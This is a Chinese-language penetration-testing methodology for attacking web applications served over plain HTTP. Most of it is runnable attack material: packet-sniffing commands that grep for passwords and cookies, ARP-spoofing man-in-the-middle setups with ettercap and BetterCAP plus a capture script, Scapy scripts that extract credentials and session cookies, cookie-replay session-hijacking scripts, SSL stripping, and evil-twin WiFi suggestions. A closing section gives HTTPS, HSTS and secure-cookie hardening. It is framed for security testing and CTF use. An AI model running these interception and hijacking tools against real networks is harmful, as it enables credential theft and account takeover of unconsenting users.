# HTTP-only 部署攻击方法论

## 1. 文档概述

### 1.1 编写目的
本方法论旨在为渗透测试人员提供针对**仅 HTTP 部署而无 HTTPS/TLS 加密的 Web 应用**进行攻击的标准化流程。重点讲解如何利用明文传输缺陷进行流量嗅探、凭证拦截和会话劫持攻击。

### 1.2 适用范围
- 适用于仅监听 HTTP 端口（80、8080 等）而无 HTTPS 配置的 Web 应用
- 适用于缺少 HSTS 响应头的 Web 应用
- 适用于 Cookie 缺少 Secure 标志的会话管理
- 适用于 Flask、Django、FastAPI 等 Python Web 框架应用
- 适用于 Docker 容器化部署的 Web 应用

### 1.3 读者对象
- 执行渗透测试的安全工程师
- 进行网络分层的攻击评估人员
- CTF 参赛选手
- 应用安全研究人员

---

## 2. 技术专题：HTTP-only 部署攻击

### 2.1 技术介绍

**漏洞原理：**
当 Web 应用仅通过 HTTP（明文）协议部署而无 HTTPS/TLS 加密时：
1. 所有网络流量以明文形式传输
2. 攻击者可在同一网络中嗅探HTTP 流量
3. 凭证、会话 Cookie、敏感数据可被截获
4. 可实施中间人（MITM）攻击注入恶意内容

**本质：**
- **传输层面**：缺乏 TLS/SSL 加密层，数据明文传输
- **配置层面**：未配置 HTTPS 重定向、HSTS 等安全机制
- **会话层面**：Cookie 缺少 Secure 标志，可通过 HTTP 传输

**技术特征：**
```python
# Flask 应用 HTTP-only 部署特征
- app.run(debug=True) 无 SSL 上下文
- 无 ssl_context 配置
- 无 HTTPS 重定向中间件
- 无 HSTS 响应头配置
- Cookie 无 Secure 标志

# Docker 配置特征
- 仅暴露 HTTP 端口（如 38583:5000）
- 无 HTTPS 端口映射
- 无反向代理 SSL 终止配置
```

### 2.2 攻击常见于哪些业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| Flask 开发环境 | app.run(debug=True) | 调试模式开启，无 HTTPS 配置，所有流量明文 |
| Docker 容器应用 | 单容器部署 | 仅暴露 HTTP 端口，无 SSL 终止代理 |
| CTF 挑战平台 | 安全培训环境 | 故意设计脆弱，HTTP 明文传输 Flag |
| 内部管理系统 | 内网 Web 应用 | 认为内网安全而不配置 HTTPS |
| 快速原型应用 | MVP/POC 环境 | 快速部署忽略安全配置 |
| IoT 设备 Web 界面 | 设备管理后台 | 嵌入式 Web 服务器无 HTTPS |

### 2.3 漏洞探测方法

#### 2.3.1 HTTP-only 部署检测

**步骤 1：检查端口监听情况**
```bash
# 检查目标主机开放端口
nmap -sV -p- target_host

# 预期结果（HTTP-only）：
# 80/tcp    open  http      Caddy httpd
# 38583/tcp open  http      Flask/Werkzeug
# 无 443/tcp https 端口
```

**步骤 2：检查 HTTPS 可用性**
```bash
# 尝试 HTTPS 连接
curl -kI https://target:443/

# 预期结果（连接失败或拒绝）：
# curl: (7) Failed to connect to target port 443: Connection refused
```

**步骤 3：检查 HTTP 响应头**
```bash
# 检查 HTTP 响应头
curl -I http://target:38583/

# 检查缺失的安全头：
# - 无 Strict-Transport-Security (HSTS)
# - 无 HTTPS 重定向
```

**步骤 4：检查 Cookie 标志**
```bash
# 检查 Set-Cookie 头
curl -I http://target:38583/login | grep -i cookie

# 预期结果（不安全配置）：
# Set-Cookie: session=abc123; Path=/
# 缺少 Secure 标志
# 缺少 HttpOnly 标志
# 缺少 SameSite 标志
```

#### 2.3.2 代码审计检测

**Flask 应用检测：**
```python
# 搜索 SSL/TLS 配置
grep -rn "ssl_context\|https\|certfile\|keyfile" /src/

# 搜索 HSTS 配置
grep -rn "Strict-Transport-Security\|HSTS" /src/

# 搜索 Secure Cookie 配置
grep -rn "SESSION_COOKIE_SECURE\|SESSION_COOKIE_HTTPONLY" /src/

# 预期结果（HTTP-only 部署）：无匹配或配置为 False
```

**Docker 配置检测：**
```bash
# 检查 docker-compose.yml
grep -A5 "ports:" docker-compose.yml

# 预期结果（HTTP-only）：
# ports:
#   - "38583:5000"  # 仅 HTTP 端口
# 无 443 端口映射
```

#### 2.3.3 网络位置评估

**攻击者网络位置评估：**
```bash
# 检查是否与目标在同一网络
ip addr show

# 检查 ARP 表
arp -a

# 检查是否可以嗅探目标流量
# 需要以下条件之一：
# 1. 同一 WiFi 网络
# 2. 同一交换机（可 ARP 欺骗）
# 3. 网关/路由器位置
# 4. ISP 级别访问
```

### 2.4 漏洞利用方法

#### 2.4.1 被动流量嗅探

**工具 1：Wireshark 图形化嗅探**
```bash
# 启动 Wireshark（需要 GUI）
wireshark &

# 或使用 tshark 命令行
tshark -i eth0 -f "port 38583" -w capture.pcap

# 过滤 HTTP 流量
tshark -r capture.pcap -Y "http.request.method == POST"

# 提取 POST 数据
tshark -r capture.pcap -Y "http.request.method == POST" \
  -T fields -e http.file_data
```

**工具 2：tcpdump 命令行嗅探**
```bash
# 捕获目标端口流量
sudo tcpdump -i eth0 -s 0 -w http_traffic.pcap port 38583

# 实时查看 HTTP 请求
sudo tcpdump -i eth0 -s 0 -A port 38583 | grep -E "POST|GET|Cookie|password"

# 提取明文凭证
sudo tcpdump -i eth0 -s 0 -A port 38583 | grep -E "username|password"
```

**工具 3：ettercap ARP 欺骗 + 嗅探**
```bash
# ARP 欺骗中间人攻击
sudo ettercap -T -q -i eth0 -M arp:remote /target_ip// /gateway_ip//

# 在另一个终端嗅探
sudo tcpdump -i eth0 -s 0 -A port 80 | grep -E "POST|Cookie"
```

#### 2.4.2 凭证拦截攻击

**场景 1：登录凭证截获**

```python
#!/usr/bin/env python3
"""
HTTP 流量凭证拦截脚本
解析捕获的 PCAP 文件提取登录凭证
"""

from scapy.all import rdpcap, TCP, Raw
import re

def extract_credentials(pcap_file):
    """从 PCAP 文件提取凭证"""

    packets = rdpcap(pcap_file)
    credentials = []

    for packet in packets:
        if TCP in packet and Raw in packet:
            payload = packet[Raw].load.decode('utf-8', errors='ignore')

            # 检测登录请求
            if 'POST' in payload and ('login' in payload.lower() or 'password' in payload.lower()):
                # 提取用户名
                username_match = re.search(r'username=([^&]*)', payload)
                password_match = re.search(r'password=([^&]*)', payload)

                if username_match and password_match:
                    username = username_match.group(1)
                    password = password_match.group(1)

                    # URL 解码
                    from urllib.parse import unquote
                    username = unquote(username)
                    password = unquote(password)

                    credentials.append({
                        'username': username,
                        'password': password,
                        'src_ip': packet['IP'].src,
                        'dst_ip': packet['IP'].dst
                    })

                    print(f"[+] Captured credentials:")
                    print(f"    Username: {username}")
                    print(f"    Password: {password}")
                    print(f"    Source IP: {packet['IP'].src}")

    return credentials

if __name__ == "__main__":
    extract_credentials("http_traffic.pcap")
```

**场景 2：会话 Cookie 截获**

```python
#!/usr/bin/env python3
"""
HTTP 会话 Cookie 拦截脚本
"""

from scapy.all import rdpcap, TCP, Raw
import re

def extract_session_cookies(pcap_file):
    """从 PCAP 文件提取会话 Cookie"""

    packets = rdpcap(pcap_file)
    sessions = []

    for packet in packets:
        if TCP in packet and Raw in packet:
            payload = packet[Raw].load.decode('utf-8', errors='ignore')

            # 检测 Set-Cookie 响应
            if 'Set-Cookie:' in payload:
                cookie_match = re.search(r'Set-Cookie:\s*([^\r\n]+)', payload)
                if cookie_match:
                    cookie = cookie_match.group(1)
                    sessions.append({
                        'cookie': cookie,
                        'src_ip': packet['IP'].src,
                        'dst_ip': packet['IP'].dst
                    })

                    print(f"[+] Captured session cookie:")
                    print(f"    Cookie: {cookie}")
                    print(f"    Server IP: {packet['IP'].src}")

            # 检测请求中的 Cookie
            elif 'Cookie:' in payload:
                cookie_match = re.search(r'Cookie:\s*([^\r\n]+)', payload)
                if cookie_match:
                    cookie = cookie_match.group(1)
                    print(f"[+] Request with session cookie:")
                    print(f"    Cookie: {cookie}")

    return sessions

if __name__ == "__main__":
    extract_session_cookies("http_traffic.pcap")
```

#### 2.4.3 会话劫持攻击

**使用截获的 Cookie 进行会话劫持：**
```bash
#!/bin/bash
# 会话劫持攻击脚本

# 假设已截获会话 Cookie
SESSION_COOKIE="session=abc123def456"
TARGET_URL="http://target:38583/dashboard"

# 使用截获的 Cookie 访问受保护页面
curl -v "$TARGET_URL" \
  -H "Cookie: $SESSION_COOKIE" \
  -H "User-Agent: Mozilla/5.0"

# 如果成功，将访问到受害用户的账户
```

**Python 会话劫持：**
```python
#!/usr/bin/env python3
"""
会话劫持攻击脚本
使用截获的 Cookie 冒充用户
"""

import requests

def session_hijacking(target_url, session_cookie):
    """使用截获的会话 Cookie 访问目标"""

    headers = {
        'Cookie': session_cookie,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
    }

    session = requests.Session()
    session.headers.update(headers)

    # 访问受保护页面
    response = session.get(target_url)

    if response.status_code == 200:
        print("[+] Session hijacking successful!")
        print(f"    Response length: {len(response.text)}")

        # 检查是否访问到用户数据
        if 'Welcome' in response.text or 'Dashboard' in response.text:
            print("[+] Accessed user dashboard")

        return response
    else:
        print(f"[-] Session hijacking failed: HTTP {response.status_code}")
        return None

if __name__ == "__main__":
    # 使用截获的 Cookie
    stolen_cookie = "session=abc123def456"
    session_hijacking("http://target:38583/dashboard", stolen_cookie)
```

#### 2.4.4 中间人攻击（MITM）

**工具：BetterCAP 中间人攻击**
```bash
# 启动 BetterCAP
sudo bettercap -iface eth0

# BetterCAP 交互命令
> net.show  # 显示网络设备
> set arp.spoof.targets 192.168.1.100  # 设置目标
> arp.spoof on  # 启用 ARP 欺骗
> http.proxy on  # 启用 HTTP 代理
> http.proxy.script js_capture.js  # 加载数据捕获脚本
```

**BetterCAP 数据捕获脚本：**
```javascript
// js_capture.js - BetterCAP 捕获脚本
function onRequest(req, res) {
    // 记录所有 HTTP 请求
    console.log("[HTTP] " + req.Method + " " + req.Url);

    // 捕获 POST 数据
    if (req.Method == "POST") {
        console.log("[POST DATA] " + req.Body);
    }

    // 捕获 Cookie
    if (req.Headers["Cookie"]) {
        console.log("[COOKIE] " + req.Headers["Cookie"]);
    }
}

function OnResponse(req, res) {
    // 记录响应
    console.log("[RESPONSE] " + res.StatusCode);
}
```

### 2.5 漏洞利用绕过方法

#### 2.5.1 绕过网络隔离

**远程攻击场景：**
```
如果无法直接嗅探目标流量（不在同一网络），可考虑：

1. 社会工程学攻击
   - 诱导用户连接恶意 WiFi
   - 设置同名 WiFi（Evil Twin）

2. 入侵网络设备
   - 攻陷路由器/交换机
   - 配置端口镜像

3. 利用 SSRF
   - 通过 SSRF 访问内部服务
   - 结合 HTTP-only 内部应用
```

#### 2.5.2 绕过 HTTPS 重定向

**如果应用配置了 HTTPS 重定向：**
```bash
# 检查是否存在 HSTS
curl -I https://target/ | grep -i strict

# 如果无 HSTS，可尝试 SSL 剥离攻击
sslstrip -l 8080 -w capture.log

# 或使用 BetterCAP
> https.proxy on
> https.proxy.intercept on
```

---

## 3. 附录

### 3.1 常用攻击工具速查表

| 工具名称 | 用途 | 使用示例 |
|---------|------|---------|
| Wireshark | 网络协议分析 | `wireshark -i eth0` |
| tcpdump | 命令行抓包 | `tcpdump -i eth0 -w capture.pcap` |
| tshark | 命令行 Wireshark | `tshark -r capture.pcap -Y http` |
| Ettercap | ARP 欺骗 + 嗅探 | `ettercap -T -M arp` |
| BetterCAP | 中间人攻击框架 | `bettercap -iface eth0` |
| sslstrip | SSL 剥离攻击 | `sslstrip -l 8080` |
| Scapy (Python) | 数据包处理 | `from scapy.all import *` |
| Burp Suite | Web 代理 + 嗅探 | Proxy → HTTP history |

### 3.2 HTTP-only 部署检测清单

| 检测项 | 检测方法 | 不安全标志 |
|-------|---------|-----------|
| HTTPS 端口 | nmap 扫描 | 无 443 端口开放 |
| HTTPS 连接 | curl 测试 | 连接被拒绝 |
| HSTS 响应头 | curl -I 检查 | 无 Strict-Transport-Security |
| HTTPS 重定向 | 访问 HTTP 观察 | 无 301/302 到 HTTPS |
| Cookie Secure 标志 | 检查 Set-Cookie | 缺少 Secure 属性 |
| Flask SSL 配置 | 代码审计 | 无 ssl_context 配置 |
| Docker 端口映射 | 检查 docker-compose.yml | 仅 HTTP 端口映射 |

### 3.3 防御建议

**配置 HTTPS：**
```python
# Flask 应用配置 HTTPS
from flask import Flask

app = Flask(__name__)

# 方法 1：使用 SSL 上下文
if __name__ == '__main__':
    app.run(
        ssl_context=('cert.pem', 'key.pem'),
        host='0.0.0.0',
        port=443
    )

# 方法 2：使用 adhoc 证书（仅开发）
if __name__ == '__main__':
    app.run(ssl_context='adhoc')
```

**配置 HSTS：**
```python
# Flask 添加 HSTS 响应头
@app.after_request
def add_security_headers(response):
    response.headers['Strict-Transport-Security'] = \
        'max-age=31536000; includeSubDomains'
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['X-Content-Type-Options'] = 'nosniff'
    return response
```

**配置 Secure Cookie：**
```python
# Flask 安全 Cookie 配置
app.config['SESSION_COOKIE_SECURE'] = True  # 仅 HTTPS 传输
app.config['SESSION_COOKIE_HTTPONLY'] = True  # 禁止 JavaScript 访问
app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'  # CSRF 防护
```

**使用反向代理：**
```yaml
# docker-compose.yml 配置 Caddy 反向代理
version: '3'
services:
  caddy:
    image: caddy:2
    ports:
      - "80:80"
      - "443:443"
    volumes:
      - ./Caddyfile:/etc/caddy/Caddyfile
      - caddy_data:/data

  app:
    build: .
    expose:
      - "5000"

volumes:
  caddy_data:
```

```
# Caddyfile 配置
example.com {
    reverse_proxy app:5000
}
```

---

**文档版本：** 1.0
**最后更新：** 2026 年 3 月
**适用场景：** 渗透测试、安全评估、CTF 挑战
